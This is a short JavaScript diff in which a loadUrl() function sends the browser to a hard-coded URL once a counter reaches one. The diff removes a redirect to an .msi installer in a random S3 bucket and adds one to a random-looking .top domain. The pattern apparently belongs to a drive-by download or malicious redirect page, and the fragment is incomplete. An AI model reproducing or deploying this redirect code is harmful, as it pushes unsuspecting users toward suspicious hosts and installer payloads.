@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://eythw.s3.ap-southeast-2.amazonaws.com/helloworld00.msi";
+		var url="https://hyeiyevverldd.top";
 		window.location=url;
 	}
 }
